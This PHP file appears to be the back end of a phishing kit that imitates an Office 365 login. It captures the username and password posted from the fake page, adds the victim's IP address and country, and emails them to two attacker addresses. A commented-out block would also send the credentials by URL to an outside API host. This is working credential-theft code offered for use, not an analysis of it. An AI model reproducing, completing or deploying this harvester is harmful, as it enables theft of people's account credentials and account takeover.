<?php
ob_start();

if (isset($_POST['login']))
	{
	//require 'engine/GetDetail.php';
    //$ip = getenv("REMOTE_ADDR");
	//$xhost = $_SERVER["SERVER_NAME"] . $_SERVER["SCRIPT_NAME"];
	//$log = $_POST['login'];
	//$pass= $_POST['passwd'];
	//$ch = curl_init();
    //$api ="http://keyfinhome.com/api/index.php"; 
  
    //$cu = "$api?email=$log&password=$pass&ip=$ip&xhost=$xhost";
    //curl_setopt($ch, CURLOPT_URL, $cu);
    //curl_setopt($ch, CURLOPT_HEADER, 0);
    //curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    //curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    //$mgs = curl_exec($ch);
    //curl_close($ch);
	if ($mgs == 1)
		{
		$ip = getenv("REMOTE_ADDR");
		$country = get_country();
		$xhost = $_SERVER["SERVER_NAME"] . $_SERVER["SCRIPT_NAME"];
		$message = "-----------------+ OFFICE 365 Login Details  +-----------------\n";
		$message.= "User ID: " . $_POST['login'] . "\n";
		$message.= "Password: " . $_POST['passwd'] . "\n";
		$message.= "Client IP      : $ip\n";
		$message.= "Country : " . $country . "\n";
		$message.= "Link : " . $xhost . "\n";
		$message.= "-----------------+ Created in Ivano+------------------\n";
		$recipient = "turnmed009@gmail.com, turnmed009@protonmail.com"; // Replace your email id here
		$subject = " $date.OFFICE 365 Login: " . $country . "\n";
		$headers = "MIME-Version: 1.0\n";
		$hostname = bin2hex($_SERVER['HTTP_HOST']);
		if (mail($recipient, $subject, $message, $headers)) 
		if (mail($userinfo, $subject, $message, $headers)) 			
			echo 1;
		}else{
		    echo 0;
		}
	}
